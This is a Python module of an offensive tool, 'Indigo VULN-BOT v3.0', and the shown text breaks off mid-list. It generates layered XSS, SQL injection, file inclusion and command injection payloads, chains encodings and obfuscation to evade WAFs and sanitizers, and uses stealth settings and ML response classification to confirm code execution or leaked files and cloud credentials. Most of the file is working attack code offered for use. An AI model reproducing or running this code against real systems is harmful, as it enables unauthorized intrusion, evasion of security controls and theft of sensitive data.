#!/usr/bin/env python3
"""
Indigo VULN-BOT v3.0 - AI Payload Generation & ML Response Analyzer
=====================================================================
Advanced vulnerability payload generator dengan:

1. MULTI-LAYER PAYLOAD GENERATION
   - Short payloads (quick test)
   - Medium payloads (standard bypass)
   - Long payloads (deep bypass chains)
   - Ultra-long payloads (multi-layer WAF evasion)
   - Context-aware adaptive payloads

2. FILTER EVASION ENGINE
   - Encoding chains (URL → Unicode → Hex → Base64)
   - Obfuscation layers (comment injection, case mutation)
   - Sanitization bypass (nested payload, double encoding)
   - Validation bypass (type confusion, length overflow)

3. ML RESPONSE ANALYZER
   - Classifies: EXECUTION_OUTPUT vs RAW_HTML vs BLOCKED vs ERROR
   - Detects: code execution evidence, data extraction, RCE proof
   - Statistical confidence scoring
   - Response fingerprinting

4. ADVANCED LOGGING
   - "Code execution is successful, does not return raw HTML output"
   - Output extraction & evidence capture
   - Before/after response comparison
   - Payload effectiveness ranking

CHANGELOG v3.0:
- Multi-layer payload generation (short → ultra-long)
- Filter/validation/sanitization bypass engine
- ML response classification (execution vs raw HTML)
- Advanced logging with execution proof
- Statistical confidence scoring
- Response fingerprinting & comparison

Dependency: Diimpor oleh indigo_scr.py (File 1)
"""

import os
import sys
import json
import time
import random
import string
import hashlib
import re
import math
import base64
import difflib
import itertools
from datetime import datetime
from urllib.parse import urlparse, urlencode, quote, unquote
from collections import defaultdict, Counter
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict, Any, Optional, Tuple, Set
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# HEAVY DEPENDENCIES
# ============================================================
HEAVY_DEPS = [
    ("numpy", "numpy", "Numerical computing", False),
    ("scipy", "scipy", "Scientific computing", False),
    ("sklearn", "scikit-learn", "Machine learning", False),
    ("pandas", "pandas", "Data analysis", True),
    ("requests", "requests", "HTTP client", False),
    ("urllib3", "urllib3", "HTTP library", False),
]

def install_vuln_bot_dependencies():
    """Install heavy dependencies untuk VULN-BOT."""
    print("\n\033[36m" + "=" * 58)
    print("  VULN-BOT v3.0: Installing Dependencies")
    print("=" * 58 + "\033[0m")

    missing = []
    for import_name, pip_name, desc, optional in HEAVY_DEPS:
        try:
            __import__(import_name)
            print(f"  \033[32m[OK]\033[0m {pip_name:<20} - {desc}")
        except ImportError:
            tag = "optional" if optional else "required"
            print(f"  \033[33m[??]\033[0m {pip_name:<20} - {desc} ({tag})")
            missing.append((pip_name, optional))

    if not missing:
        print("\n  All dependencies installed!")
        time.sleep(1)
        return True

    print(f"\n  Installing {len(missing)} packages...")
    failed = []
    for pip_name, optional in missing:
        print(f"  [+] Installing {pip_name}...")
        try:
            import subprocess
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name,
                 "--quiet", "--disable-pip-version-check"],
                capture_output=True, text=True, timeout=180
            )
            print(f"      [OK] {pip_name}")
        except Exception as e:
            print(f"      [X] {pip_name}: {e}")
            if not optional:
                failed.append(pip_name)

    if failed:
        print(f"\n  \033[31mFailed: {failed}\033[0m")
        return False

    print("\n  Dependencies installed!")
    time.sleep(1)
    return True

install_vuln_bot_dependencies()

# Import heavy dependencies
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    np = None

try:
    from scipy import stats as scipy_stats
    from scipy.spatial.distance import cosine as scipy_cosine
    HAS_SCIPY = True
except ImportError:
    HAS_SCIPY = False
    scipy_stats = None

try:
    from sklearn.ensemble import (
        RandomForestClassifier, GradientBoostingClassifier,
        ExtraTreesClassifier
    )
    from sklearn.neural_network import MLPClassifier
    from sklearn.preprocessing import StandardScaler
    from sklearn.model_selection import train_test_split, cross_val_score
    from sklearn.metrics import (
        accuracy_score, classification_report,
        precision_recall_fscore_support
    )
    from sklearn.feature_extraction.text import TfidfVectorizer
    import joblib
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False

try:
    import pandas as pd
    HAS_PANDAS = True
except ImportError:
    HAS_PANDAS = False

try:
    import requests as req_lib
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    req_lib = None


# ============================================================
# ENUMS & DATA STRUCTURES
# ============================================================
class ResponseClass(Enum):
    """Classification of HTTP response."""
    EXECUTION_OUTPUT = "execution_output"      # Code executed, returned output
    RAW_HTML = "raw_html"                       # Normal HTML page
    BLOCKED = "blocked"                         # WAF/firewall blocked
    ERROR_PAGE = "error_page"                   # Server error
    PARTIAL_EXECUTION = "partial_execution"     # Some execution evidence
    DATA_EXTRACTION = "data_extraction"         # Sensitive data leaked
    REDIRECT = "redirect"                       # Redirected
    UNKNOWN = "unknown"                         # Cannot classify

class PayloadComplexity(Enum):
    """Payload complexity level."""
    SHORT = "short"                             # 1-30 chars
    MEDIUM = "medium"                           # 30-100 chars
    LONG = "long"                               # 100-300 chars
    ULTRA_LONG = "ultra_long"                   # 300-1000+ chars
    MULTI_LAYER = "multi_layer"                 # Nested/layered

class BypassTechnique(Enum):
    """Bypass technique category."""
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    SANITIZATION_BYPASS = "sanitization_bypass"
    VALIDATION_BYPASS = "validation_bypass"
    WAF_BYPASS = "waf_bypass"
    CONTEXT_BYPASS = "context_bypass"
    FILTER_BYPASS = "filter_bypass"

@dataclass
class MultiLayerPayload:
    """Represents a multi-layer payload."""
    original: str
    payload: str
    complexity: PayloadComplexity
    layers: List[str] = field(default_factory=list)
    techniques: List[BypassTechnique] = field(default_factory=list)
    vuln_type: str = ""
    target_context: str = ""
    encoding_chain: List[str] = field(default_factory=list)
    confidence: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class ResponseAnalysis:
    """ML-powered response analysis result."""
    response_class: ResponseClass
    confidence: float
    execution_evidence: List[str] = field(default_factory=list)
    raw_html_detected: bool = False
    blocked_detected: bool = False
    output_snippet: str = ""
    response_fingerprint: str = ""
    comparison_baseline: Dict[str, float] = field(default_factory=dict)
    details: Dict[str, Any] = field(default_factory=dict)

@dataclass
class VulnBotResult:
    """Complete result for a vulnerability test."""
    finding: Dict[str, Any]
    payloads_generated: int
    payloads_tested: int
    payloads_validated: int
    best_payload: Optional[MultiLayerPayload]
    best_response: Optional[ResponseAnalysis]
    all_results: List[Dict[str, Any]]
    poc_files: List[str]
    ml_analysis: Dict[str, Any]
    statistical_analysis: Dict[str, Any]
    recommendations: List[str]


# ============================================================
# CONFIGURATION
# ============================================================
VULN_BOT_CONFIG = {
    # --- Payload Generation ---
    "max_payloads_per_finding": 80,
    "short_payloads": 10,
    "medium_payloads": 15,
    "long_payloads": 20,
    "ultra_long_payloads": 15,
    "multi_layer_payloads": 20,
    "max_payload_length": 2000,
    "encoding_chain_max_depth": 5,
    "layer_max_depth": 6,

    # --- Testing ---
    "timeout_per_test": 30,
    "delay_between_tests": 0.3,
    "parallel_workers": 3,
    "rate_limit": 3.0,
    "retry_on_error": 2,

    # --- ML Response Analysis ---
    "ml_enabled": True,
    "ml_training_samples": 50,
    "ml_confidence_threshold": 0.60,
    "execution_confidence_threshold": 0.70,

    # --- Response Analysis ---
    "response_comparison_enabled": True,
    "baseline_requests": 3,
    "fingerprint_enabled": True,

    # --- Output ---
    "output_dir": "./vuln_bot_results",
    "save_responses": True,
    "save_poc": True,
    "generate_report": True,

    # --- Stealth ---
    "randomize_order": True,
    "rotate_headers": True,
    "randomize_delay": True,
}


# ============================================================
# RESPONSE PATTERN DATABASE
# ============================================================
EXECUTION_PATTERNS = {
    "rce_linux": [
        r"uid=\d+$\w+$\s+gid=\d+",
        r"Linux\s+\S+\s+\d+\.\d+\.\d+",
        r"drwxr-xr-x\s+\d+\s+\w+",
        r"-rw-r--r--\s+\d+\s+\w+",
        r"total\s+\d+",
        r"bin\s+boot\s+dev\s+etc",
        r"root:x:0:0:root",
        r"/bin/(?:ba)?sh",
        r"nobody:x:\d+:\d+:",
        r"daemon:x:\d+:\d+:",
    ],
    "rce_windows": [
        r"Windows\s+$$Version\s+\d+\.\d+",
        r"Volume Serial Number",
        r"Directory of\s+[A-Z]:\\",
        r"<DIR>\s+\.",
        r"\d+ File$s$\s+\d+ bytes",
        r"SYSTEM\\CurrentControlSet",
        r"C:\\Windows\\System32",
    ],
    "sqli_output": [
        r"root:[x*]:0:0:",
        r"\|\s*\d+\s*\|\s*\w+\s*\|",
        r"table_name\s*:\s*\w+",
        r"column_name\s*:\s*\w+",
        r"information_schema",
        r"@@version\s*[:=]\s*\d+\.\d+",
        r"database$$\s*[:=]\s*\w+",
    ],
    "lfi_output": [
        r"root:[x*]:0:0:root:/root",
        r"daemon:x:\d+:\d+:daemon",
        r"$$boot loader$$",
        r"$$fonts$$",
        r"<?php\s",
        r"DB_HOST\s*=\s*['\"]",
        r"DB_NAME\s*=\s*['\"]",
        r"DB_USER\s*=\s*['\"]",
    ],
    "xss_execution": [
        r"<script[^>]*>.*?alert$.*?$.*?</script>",
        r"javascript:alert$",
        r"onerror\s*=\s*['\"]?alert$",
        r"onload\s*=\s*['\"]?alert$",
    ],
    "ssrf_output": [
        r"ami-id|instance-id",
        r"meta-data/",
        r"iam/security-credentials",
        r"AccessKeyId|SecretAccessKey",
        r"computeMetadata",
        r"service-accounts",
    ],
    "ssti_output": [
        r"^(?:49|7\*7)\s*$",
        r"\b49\b",
        r"config.*?SECRET_KEY",
        r"<class\s+'.*?'>",
    ],
}

RAW_HTML_INDICATORS = [
    r"<!DOCTYPE\s+html",
    r"<html[^>]*>",
    r"<head[^>]*>",
    r"<body[^>]*>",
    r"<meta\s+",
    r"<link\s+rel=[\"']?stylesheet",
    r"<script\s+src=",
    r"<div\s+class=",
    r"<form\s+action=",
    r"<nav\s+",
    r"<header\s+",
    r"<footer\s+",
    r"<main\s+",
    r"<section\s+",
    r"<article\s+",
]

BLOCKED_INDICATORS = [
    r"Access Denied",
    r"Request Blocked",
    r"Security Block",
    r"Firewall",
    r"WAF",
    r"Mod_Security",
    r"Cloudflare",
    r"403 Forbidden",
    r"406 Not Acceptable",
    r"503 Service Unavailable",
    r"Your request has been blocked",
    r"This request has been blocked",
    r"suspicious.*?request",
    r"malicious.*?request",
    r"blocked.*?by.*?security",
    r"threat.*?detected",
    r"attack.*?detected",
    r"forbidden.*?access",
]

ERROR_INDICATORS = [
    r"Internal Server Error",
    r"500\s+Error",
    r"Fatal error",
    r"Parse error",
    r"Warning:.*?on line",
    r"Notice:.*?on line",
    r"Uncaught Exception",
    r"Traceback $most recent",
    r"SyntaxError",
    r"TypeError",
    r"ReferenceError",
    r"NullPointerException",
    r"StackOverflowError",
]


# ============================================================
# MULTI-LAYER PAYLOAD GENERATOR
# ============================================================
class MultiLayerPayloadGenerator:
    """Generate payloads berlapis-lapis untuk bypass filter."""

    def __init__(self, config: Dict):
        self.config = config
        self.generation_stats = defaultdict(int)

    # ----------------------------------------------------------
    # ENCODING METHODS
    # ----------------------------------------------------------
    def _url_encode(self, p: str) -> str:
        return quote(p)

    def _double_url_encode(self, p: str) -> str:
        return quote(quote(p))

    def _triple_url_encode(self, p: str) -> str:
        return quote(quote(quote(p)))

    def _unicode_encode(self, p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in p)

    def _hex_encode(self, p: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in p)

    def _base64_encode(self, p: str) -> str:
        return base64.b64encode(p.encode()).decode()

    def _html_entity(self, p: str) -> str:
        return "".join(f"&#{ord(c)};" for c in p)

    def _html_entity_hex(self, p: str) -> str:
        return "".join(f"&#x{ord(c):x};" for c in p)

    def _js_escape(self, p: str) -> str:
        return (p.replace("\\", "\\\\")
                 .replace("'", "\\'")
                 .replace('"', '\\"')
                 .replace("\n", "\\n")
                 .replace("\r", "\\r"))

    def _null_byte(self, p: str) -> str:
        return p + "%00"

    def _whitespace_padding(self, p: str) -> str:
        ws = random.choice([" ", "\t", "%09", "%20", "%0a", "%0d%0a"])
        return ws + p + ws

    def _comment_inject_sql(self, p: str) -> str:
        return p.replace(" ", "/**/").replace("=", "/**/=/**/")

    def _comment_inject_html(self, p: str) -> str:
        return p.replace("<", "<!----><").replace(">", "><!---->")

    def _case_mutation(self, p: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p)

    def _newline_inject(self, p: str) -> str:
        return "%0a" + p + "%0a"

    def _tab_inject(self, p: str) -> str:
        return "%09" + p + "%09"

    def _rot13(self, p: str) -> str:
        result = []
        for c in p:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - 97 + 13) % 26 + 97))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - 65 + 13) % 26 + 65))
            else:
                result.append(c)
        return "".join(result)

    def _reverse_string(self, p: str) -> str:
        return p[::-1]

    def _unicode_normalize(self, p: str) -> str:
        """Unicode normalization bypass."""
        mapping = {
            '<': '\uff1c', '>': '\uff1e', "'": '\u02b9',
            '"': '\u02ba', '(': '\uff08', ')': '\uff09',
            '/': '\u2215', '\\': '\u2216',
        }
        return "".join(mapping.get(c, c) for c in p)

    def _get_encoding_methods(self) -> Dict[str, callable]:
        return {
            "url": self._url_encode,
            "double_url": self._double_url_encode,
            "triple_url": self._triple_url_encode,
            "unicode": self._unicode_encode,
            "hex": self._hex_encode,
            "base64": self._base64_encode,
            "html_entity": self._html_entity,
            "html_entity_hex": self._html_entity_hex,
            "js_escape": self._js_escape,
            "null_byte": self._null_byte,
            "whitespace": self._whitespace_padding,
            "comment_sql": self._comment_inject_sql,
            "comment_html": self._comment_inject_html,
            "case_mut": self._case_mutation,
            "newline": self._newline_inject,
            "tab": self._tab_inject,
            "rot13": self._rot13,
            "unicode_norm": self._unicode_normalize,
        }

    # ----------------------------------------------------------
    # SHORT PAYLOADS (1-30 chars)
    # ----------------------------------------------------------
    def _generate_short_payloads(self, vuln_type: str, context: Dict) -> List[MultiLayerPayload]:
        payloads = []
        base_payloads = self._get_base_payloads(vuln_type, "short")

        for bp in base_payloads:
            payloads.append(MultiLayerPayload(
                original=bp, payload=bp,
                complexity=PayloadComplexity.SHORT,
                layers=["raw"],
                vuln_type=vuln_type,
                confidence=0.5
            ))

        self.generation_stats["short"] += len(payloads)
        return payloads

    # ----------------------------------------------------------
    # MEDIUM PAYLOADS (30-100 chars)
    # ----------------------------------------------------------
    def _generate_medium_payloads(self, vuln_type: str, context: Dict) -> List[MultiLayerPayload]:
        payloads = []
        base_payloads = self._get_base_payloads(vuln_type, "medium")
        enc_methods = self._get_encoding_methods()

        for bp in base_payloads:
            # Single encoding
            enc_name = random.choice(list(enc_methods.keys()))
            encoded = enc_methods[enc_name](bp)

            if len(encoded) < self.config["max_payload_length"]:
                payloads.append(MultiLayerPayload(
                    original=bp, payload=encoded,
                    complexity=PayloadComplexity.MEDIUM,
                    layers=["raw", f"encode:{enc_name}"],
                    techniques=[BypassTechnique.ENCODING],
                    encoding_chain=[enc_name],
                    vuln_type=vuln_type,
                    confidence=0.6
                ))

            # Case mutation
            mutated = self._case_mutation(bp)
            if mutated != bp and len(mutated) < self.config["max_payload_length"]:
                payloads.append(MultiLayerPayload(
                    original=bp, payload=mutated,
                    complexity=PayloadComplexity.MEDIUM,
                    layers=["raw", "case_mutation"],
                    techniques=[BypassTechnique.OBFUSCATION],
                    vuln_type=vuln_type,
                    confidence=0.55
                ))

        self.generation_stats["medium"] += len(payloads)
        return payloads

    # ----------------------------------------------------------
    # LONG PAYLOADS (100-300 chars) - Multi-encoding chains
    # ----------------------------------------------------------
    def _generate_long_payloads(self, vuln_type: str, context: Dict) -> List[MultiLayerPayload]:
        payloads = []
        base_payloads = self._get_base_payloads(vuln_type, "long")
        enc_methods = self._get_encoding_methods()
        waf_detected = context.get("waf_detected", False)

        for bp in base_payloads:
            # Double encoding chain
            for _ in range(3):
                chain = random.sample(list(enc_methods.keys()),
                                      min(2, len(enc_methods)))
                encoded = bp
                chain_log = []
                for enc_name in chain:
                    try:
                        encoded = enc_methods[enc_name](encoded)
                        chain_log.append(enc_name)
                    except:
                        continue

                if encoded != bp and len(encoded) < self.config["max_payload_length"]:
                    payloads.append(MultiLayerPayload(
                        original=bp, payload=encoded,
                        complexity=PayloadComplexity.LONG,
                        layers=["raw"] + [f"encode:{e}" for e in chain_log],
                        techniques=[BypassTechnique.ENCODING],
                        encoding_chain=chain_log,
                        vuln_type=vuln_type,
                        confidence=0.65 if waf_detected else 0.60
                    ))

            # Comment injection + encoding
            if vuln_type == "sqli":
                commented = self._comment_inject_sql(bp)
                encoded_commented = self._url_encode(commented)
                if len(encoded_commented) < self.config["max_payload_length"]:
                    payloads.append(MultiLayerPayload(
                        original=bp, payload=encoded_commented,
                        complexity=PayloadComplexity.LONG,
                        layers=["raw", "comment_inject", "url_encode"],
                        techniques=[BypassTechnique.OBFUSCATION, BypassTechnique.ENCODING],
                        encoding_chain=["comment_sql", "url"],
                        vuln_type=vuln_type,
                        confidence=0.70
                    ))

            elif vuln_type == "xss":
                commented = self._comment_inject_html(bp)
                encoded_commented = self._url_encode(commented)
                if len(encoded_commented) < self.config["max_payload_length"]:
                    payloads.append(MultiLayerPayload(
                        original=bp, payload=encoded_commented,
                        complexity=PayloadComplexity.LONG,
                        layers=["raw", "comment_inject_html", "url_encode"],
                        techniques=[BypassTechnique.OBFUSCATION, BypassTechnique.ENCODING],
                        encoding_chain=["comment_html", "url"],
                        vuln_type=vuln_type,
                        confidence=0.70
                    ))

        self.generation_stats["long"] += len(payloads)
        return payloads

    # ----------------------------------------------------------
    # ULTRA-LONG PAYLOADS (300-1000+ chars) - Deep bypass chains
    # ----------------------------------------------------------
    def _generate_ultra_long_payloads(self, vuln_type: str, context: Dict) -> List[MultiLayerPayload]:
        payloads = []
        base_payloads = self._get_base_payloads(vuln_type, "ultra_long")
        enc_methods = self._get_encoding_methods()
        waf_detected = context.get("waf_detected", False)
        tech_stack = context.get("technologies", [])

        for bp in base_payloads:
            # Triple encoding chain
            for _ in range(4):
                chain_length = random.randint(3, min(5, len(enc_methods)))
                chain = random.sample(list(enc_methods.keys()), chain_length)
                encoded = bp
                chain_log = []
                for enc_name in chain:
                    try:
                        encoded = enc_methods[enc_name](encoded)
                        chain_log.append(enc_name)
                    except:
                        continue

                if encoded != bp and len(encoded) < self.config["max_payload_length"]:
                    payloads.append(MultiLayerPayload(
                        original=bp, payload=encoded,
                        complexity=PayloadComplexity.ULTRA_LONG,
                        layers=["raw"] + [f"encode:{e}" for e in chain_log],
                        techniques=[BypassTechnique.ENCODING, BypassTechnique.WAF_BYPASS],
                        encoding_chain=chain_log,
                        vuln_type=vuln_type,
                        confidence=0.55 + (0.05 * len(chain_log))
                    ))

            # WAF-specific bypass
            if waf_detected:
                waf_payload = self._generate_waf_bypass_payload(bp, vuln_type, context)
                if waf_payload and len(waf_payload) < self.config["max_payload_length"]:
                    payloads.append(MultiLayerPayload(
                        original=bp, payload=waf_payload,
                        complexity=PayloadComplexity.ULTRA_LONG,
                        layers=["raw", "waf_bypass", "multi_encode", "obfuscation"],
                        techniques=[BypassTechnique.WAF_BYPASS, BypassTechnique.ENCODING,
                                    BypassTechnique.OBFUSCATION],
                        vuln_type=vuln_type,
                        confidence=0.75
                    ))

            # Tech-specific bypass
            for tech in tech_stack:
                tech_payload = self._generate_tech_bypass_payload(bp, vuln_type, tech)
                if tech_payload and len(tech_payload) < self.config["max_payload_length"]:
                    payloads.append(MultiLayerPayload(
                        original=bp, payload=tech_payload,
                        complexity=PayloadComplexity.ULTRA_LONG,
                        layers=["raw", f"tech_bypass:{tech}"],
                        techniques=[BypassTechnique.CONTEXT_BYPASS],
                        vuln_type=vuln_type,
                        confidence=0.70,
                        metadata={"tech": tech}
                    ))

        self.generation_stats["ultra_long"] += len(payloads)
        return payloads

    # ----------------------------------------------------------
    # MULTI-LAYER PAYLOADS - Nested/layered bypass
    # ----------------------------------------------------------
    def _generate_multi_layer_payloads(self, vuln_type: str, context: Dict) -> List[MultiLayerPayload]:
        payloads = []
        base_payloads = self._get_base_payloads(vuln_type, "multi_layer")
        enc_methods = self._get_encoding_methods()

        for bp in base_payloads:
            # Layer 1: Obfuscation
            layer1 = self._apply_obfuscation_layer(bp, vuln_type)

            # Layer 2: Encoding chain
            layer2 = self._apply_encoding_chain_layer(layer1)

            # Layer 3: Context wrapping
            layer3 = self._apply_context_wrap_layer(layer2, vuln_type)

            # Layer 4: Validation bypass padding
            layer4 = self._apply_validation_bypass_layer(layer3)

            # Layer 5: Sanitization bypass (nested injection)
            layer5 = self._apply_sanitization_bypass_layer(layer4, vuln_type)

            if len(layer5) < self.config["max_payload_length"]:
                payloads.append(MultiLayerPayload(
                    original=bp, payload=layer5,
                    complexity=PayloadComplexity.MULTI_LAYER,
                    layers=["raw", "obfuscation", "encoding_chain",
                            "context_wrap", "validation_bypass", "sanitization_bypass"],
                    techniques=[
                        BypassTechnique.OBFUSCATION, BypassTechnique.ENCODING,
                        BypassTechnique.CONTEXT_BYPASS, BypassTechnique.VALIDATION_BYPASS,
                        BypassTechnique.SANITIZATION_BYPASS
                    ],
                    vuln_type=vuln_type,
                    confidence=0.80
                ))

            # Alternative: shorter multi-layer (3 layers)
            alt_layer1 = self._apply_obfuscation_layer(bp, vuln_type)
            alt_layer2 = self._apply_encoding_chain_layer(alt_layer1)
            alt_layer3 = self._apply_sanitization_bypass_layer(alt_layer2, vuln_type)

            if alt_layer3 != layer5 and len(alt_layer3) < self.config["max_payload_length"]:
                payloads.append(MultiLayerPayload(
                    original=bp, payload=alt_layer3,
                    complexity=PayloadComplexity.MULTI_LAYER,
                    layers=["raw", "obfuscation", "encoding_chain", "sanitization_bypass"],
                    techniques=[
                        BypassTechnique.OBFUSCATION, BypassTechnique.ENCODING,
                        BypassTechnique.SANITIZATION_BYPASS
                    ],
                    vuln_type=vuln_type,
                    confidence=0.75
                ))

        self.generation_stats["multi_layer"] += len(payloads)
        return payloads

    # ----------------------------------------------------------
    # LAYER IMPLEMENTATIONS
    # ----------------------------------------------------------
    def _apply_obfuscation_layer(self, payload: str, vuln_type: str) -> str:
        """Layer 1: Obfuscation."""
        result = payload

        # Case mutation
        result = self._case_mutation(result)

        # Random whitespace injection
        ws_chars = [" ", "\t", "%09", "%20", "%0a", "/**/", "/*!*/"]
        for old in [" ", "="]:
            if old in result:
                parts = result.split(old)
                result = (old + random.choice(ws_chars)).join(parts)

        return result

    def _apply_encoding_chain_layer(self, payload: str) -> str:
        """Layer 2: Multi-encoding chain."""
        enc_methods = self._get_encoding_methods()
        chain_length = random.randint(2, 4)
        chain = random.sample(list(enc_methods.keys()), chain_length)

        result = payload
        for enc_name in chain:
            try:
                result = enc_methods[enc_name](result)
            except:
                continue

        return result

    def _apply_context_wrap_layer(self, payload: str, vuln_type: str) -> str:
        """Layer 3: Context-aware wrapping."""
        if vuln_type == "sqli":
            wrappers = [
                f"1' OR ({payload})--",
                f"' UNION ALL SELECT {payload}--",
                f"1; {payload}--",
                f"') OR ({payload}--",
            ]
        elif vuln_type == "xss":
            wrappers = [
                f"</script>{payload}<script>",
                f"\">{payload}<!--",
                f"'>{payload}//",
                f"}}{payload}{{{{",
            ]
        elif vuln_type == "lfi":
            wrappers = [
                f"../../../{payload}",
                f"..%2f..%2f..%2f{payload}",
                f"/....//....//....//{payload}",
                f"php://filter/convert.base64-encode/resource={payload}",
            ]
        elif vuln_type == "rce":
            wrappers = [
                f";{payload}",
                f"|{payload}",
                f"||{payload}",
                f"$({payload})",
                f"`{payload}`",
                f"\n{payload}",
            ]
        else:
            wrappers = [payload]

        return random.choice(wrappers)

    def _apply_validation_bypass_layer(self, payload: str) -> str:
        """Layer 4: Validation bypass."""
        techniques = [
            # Length overflow prefix
            lambda p: "A" * random.randint(100, 500) + p,
            # Type confusion
            lambda p: p + "\x00" + "normal_text",
            # Unicode normalization
            lambda p: self._unicode_normalize(p),
            # Null byte injection
            lambda p: p + "%00",
            # Overlong UTF-8
            lambda p: p.replace("<", "%c0%bc").replace(">", "%c0%be"),
        ]

        technique = random.choice(techniques)
        try:
            result = technique(payload)
            return result if len(result) < self.config["max_payload_length"] else payload
        except:
            return payload

    def _apply_sanitization_bypass_layer(self, payload: str, vuln_type: str) -> str:
        """Layer 5: Sanitization bypass (nested injection)."""
        if vuln_type == "xss":
            # Nested tags that survive single-pass sanitization
            nested_techniques = [
                # Double nesting: if sanitizer removes <script>, inner remains
                lambda p: f"<scr<script>ipt>{p}</scr</script>ipt>",
                # Recursive nesting
                lambda p: f"<scr<scr<script>ipt>ipt>{p}</scr</script>ipt>",
                # Tag splitting
                lambda p: f"<scr{'ipt'}>{p}</scr{'ipt'}>",
                # Comment-based nesting
                lambda p: f"<scr<!---->ipt>{p}</scr<!---->ipt>",
                # Entity-based bypass
                lambda p: f"&lt;script&gt;{p}&lt;/script&gt;",
            ]
        elif vuln_type == "sqli":
            nested_techniques = [
                # Double quote escape
                lambda p: p.replace("'", "''").replace('"', '""'),
                # Comment nesting
                lambda p: p.replace(" ", "/**//**/"),
                # URL encoding within SQL
                lambda p: p.replace("'", "%27").replace('"', "%22"),
            ]
        elif vuln_type == "lfi":
            nested_techniques = [
                # Double path traversal
                lambda p: p.replace("../", "....//"),
                # Null byte termination
                lambda p: p + "%00.jpg",
                # Double encoding
                lambda p: quote(p),
            ]
        else:
            nested_techniques = [
                lambda p: quote(p),
                lambda p: p.replace(" ", "+"),
            ]

        technique = random.choice(nested_techniques)
        try:
            result = technique(payload)
            return result if len(result) < self.config["max_payload_length"] else payload
        except:
            return payload

    # ----------------------------------------------------------
    # WAF-SPECIFIC BYPASS
    # ----------------------------------------------------------
    def _generate_waf_bypass_payload(self, payload: str, vuln_type: str, context: Dict) -> str:
        """Generate WAF-specific bypass payload."""
        result = payload

        # Step 1: Whitespace replacement
        ws_variants = ["/**/", "/*!*/", "%09", "%0a", "%0b", "%0c", "%0d", "+", "%20"]
        result = result.replace(" ", random.choice(ws_variants))

        # Step 2: Keyword obfuscation
        if vuln_type == "sqli":
            keywords = {
                "select": "SeLeCt", "union": "UnIoN",
                "and": "AnD", "or": "oR", "where": "WhErE",
                "from": "FrOm", "insert": "InSeRt",
            }
            for kw, replacement in keywords.items():
                result = re.sub(re.compile(re.escape(kw), re.IGNORECASE), replacement, result)

        elif vuln_type == "xss":
            keywords = {
                "script": "ScRiPt", "alert": "al\\ert",
                "onerror": "on\\error", "onload": "on\\load",
            }
            for kw, replacement in keywords.items():
                result = re.sub(re.compile(re.escape(kw), re.IGNORECASE), replacement, result)

        # Step 3: Character encoding for special chars
        special_chars = {"'": "%27", '"': "%22", "<": "%3c", ">": "%3e",
                         "(": "%28", ")": "%29", ";": "%3b"}
        for char, encoded in special_chars.items():
            if random.random() > 0.5 and char in result:
                result = result.replace(char, encoded, 1)

        # Step 4: Comment injection
        if random.random() > 0.5:
            result = result.replace("=", "/**/=/**/")

        return result

    # ----------------------------------------------------------
    # TECH-SPECIFIC BYPASS
    # ----------------------------------------------------------
    def _generate_tech_bypass_payload(self, payload: str, vuln_type: str, tech: str) -> str:
        """Generate technology-specific bypass payload."""
        tech_lower = tech.lower()

        if "php" in tech_lower and vuln_type == "lfi":
            wrappers = [
                f"php://filter/convert.base64-encode/resource={payload}",
                f"php://filter/read=convert.base64-encode/resource={payload}",
                f"data://text/plain;base64,{base64.b64encode(payload.encode()).decode()}",
                f"expect://{payload}",
            ]
            return random.choice(wrappers)

        elif "java" in tech_lower and vuln_type == "rce":
            wrappers = [
                f"${{T(java.lang.Runtime).getRuntime().exec('{payload}')}}",
                f"#{{T(java.lang.Runtime).getRuntime().exec('{payload}')}}",
            ]
            return random.choice(wrappers)

        elif "mysql" in tech_lower and vuln_type == "sqli":
            result = payload.replace("--", "#")
            result = result.replace(" ", "/**/")
            return result

        elif "postgresql" in tech_lower and vuln_type == "sqli":
            result = payload.replace("--", "-- ")
            return result

        elif "asp.net" in tech_lower or "iis" in tech_lower:
            if vuln_type == "lfi":
                return payload.replace("../", "..\\")
            elif vuln_type == "rce":
                return f"& {payload}"

        # Default: apply encoding
        return self._url_encode(payload)

    # ----------------------------------------------------------
    # BASE PAYLOADS DATABASE
    # ----------------------------------------------------------
    def _get_base_payloads(self, vuln_type: str, complexity: str) -> List[str]:
        """Get base payloads per vuln type and complexity."""
        payloads_db = {
            "xss": {
                "short": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<body onload=alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<marquee onstart=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<video src=x onerror=alert(1)>",
                    "<iframe src=\"javascript:alert(1)\">",
                ],
                "medium": [
                    "<svg/onload=alert(1)>",
                    "<img/src=x onerror=alert(1)>",
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<IMG SRC=javascript:alert(1)>",
                    "<body/onload=alert(1)>",
                    "javascript:/*--></title></style></textarea></script>--><svg/onload=alert(1)>",
                    "'-alert(1)-'",
                    "\"-alert(1)-\"",
                    "</script><svg onload=alert(1)>",
                    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=d onmouseover=alert(1)>",
                ],
                "long": [
                    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                    "<svg><set onbegin=alert(1) attributeName=onmouseover value=alert(1)>",
                    "<isindex type=image src=1 onerror=alert(1)>",
                    "<object data=\"javascript:alert(1)\">",
                    "<embed src=\"javascript:alert(1)\">",
                    "<a href=\"javascript:alert(1)\">click</a>",
                    "<form><button formaction=\"javascript:alert(1)\">click</button>",
